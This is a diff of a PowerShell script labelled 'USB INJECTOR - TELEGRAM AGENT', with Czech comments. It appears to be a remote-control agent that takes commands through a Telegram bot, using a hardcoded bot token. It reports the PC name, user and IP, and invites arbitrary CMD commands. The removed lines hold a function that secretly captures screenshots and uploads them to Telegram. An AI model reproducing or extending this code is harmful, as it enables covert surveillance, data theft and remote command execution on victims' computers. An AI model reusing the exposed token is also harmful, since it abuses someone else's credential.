@@ -1,6 +1,3 @@
-# ============================================
-# USB INJECTOR - TELEGRAM AGENT
-# ============================================
 
 $botToken = '8510265210:AAH9HMaiR1ineEhf4SHtZBCaiO1HBPbcYTw'
 $stateFile = "C:\agent_state.txt"
@@ -86,89 +83,6 @@ function Send-Message($text) {
     }
 }
 
-function Send-Screenshot {
-    if(!$chatId){
-        Write-Log "ERROR: chatId neni nastaveno"
-        return
-    }
-    
-    Write-Log "Delam screenshot..."
-    
-    try {
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Drawing
-        
-        # Smaž clipboard
-        [System.Windows.Forms.Clipboard]::Clear()
-        
-        # Simuluj stisknutí PrintScreen
-        Add-Type -AssemblyName System.Windows.Forms
-        [System.Windows.Forms.SendKeys]::SendWait("{PRTSC}")
-        
-        # Počkej na zachycení
-        Start-Sleep -Milliseconds 500
-        
-        # Získej obrázek z clipboardu
-        $image = [System.Windows.Forms.Clipboard]::GetImage()
-        
-        if($image -eq $null) {
-            throw "Screenshot se nepodaril - clipboard je prazdny"
-        }
-        
-        Write-Log "Screenshot zachycen: $($image.Width)x$($image.Height)"
-        
-        # Ulož do souboru
-        $screenshotPath = "C:\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
-        $image.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
-        
-        # Uvolni prostředky
-        $image.Dispose()
-        [System.Windows.Forms.Clipboard]::Clear()
-        
-        Write-Log "Screenshot ulozen: $screenshotPath"
-        
-        # Pošli do Telegramu
-        $uri = "https://api.telegram.org/bot$botToken/sendPhoto"
-        
-        try {
-            # PowerShell 6+ způsob
-            $form = @{
-                chat_id = $chatId
-                photo = Get-Item -Path $screenshotPath
-            }
-            Invoke-RestMethod -Uri $uri -Method Post -Form $form | Out-Null
-            Write-Log "Screenshot odeslan (metoda 1)"
-        } catch {
-            # PowerShell 5.1 fallback
-            $fileBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
-            $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
-            $boundary = [System.Guid]::NewGuid().ToString()
-            $LF = "`r`n"
-            
-            $bodyLines = (
-                "--$boundary",
-                "Content-Disposition: form-data; name=`"chat_id`"$LF",
-                $chatId,
-                "--$boundary",
-                "Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.png`"",
-                "Content-Type: image/png$LF",
-                $fileEnc,
-                "--$boundary--$LF"
-            ) -join $LF
-            
-            Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines | Out-Null
-            Write-Log "Screenshot odeslan (metoda 2)"
-        }
-        
-        # Smaž soubor
-        Remove-Item $screenshotPath -Force
-        Write-Log "Screenshot dokoncen"
-        
-    } catch {
-        Write-Log "ERROR pri screenshotu: $_"
-        Send-Message "[ERROR] Screenshot selhal: $($_.Exception.Message)"
-    }
-}
 Write-Log "Vstupuji do hlavni smycky"
 $loopCount = 0
 
@@ -218,10 +132,7 @@ while($true) {
                 }
                 Send-Message "[STATUS]`nPC: $pc`nUser: $user`nIP: $ip`nOnline"
             } elseif($cmd -eq '/help') {
-                Send-Message "Prikazy:`n/status - Info o PC`n/help - Napoveda`n/screenshot - Screenshot obrazovky`n/log - Zobraz log`n/kill - Ukonci agenta`n`nZadej CMD prikaz (ipconfig, dir, whoami, tasklist...)"
-            } elseif($cmd -eq '/screenshot') {
-                Send-Message "Delam screenshot..."
-                Send-Screenshot
+                Send-Message "Prikazy:`n/status - Info o PC`n/help - Napoveda`n/log - Zobraz log`n/kill - Ukonci agenta`n`nZadej CMD prikaz (ipconfig, dir, whoami, tasklist...)"
             } elseif($cmd -eq '/log') {
                 if(Test-Path $logFile) {
                     $logContent = Get-Content $logFile -Encoding UTF8 | Select-Object -Last 30 | Out-String
